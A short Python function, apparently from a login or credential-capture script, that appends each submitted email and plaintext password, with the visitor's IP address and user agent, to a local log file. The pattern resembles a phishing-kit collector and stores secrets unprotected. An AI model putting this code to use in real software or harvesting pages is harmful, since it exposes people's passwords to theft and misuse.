from datetime import datetime

def log_credentials(email, password, user_agent, ip):
    with open('credentials_log.txt', 'a') as f:
        f.write(f"{datetime.now()} | {ip} | {user_agent} | {email} | {password}\n")
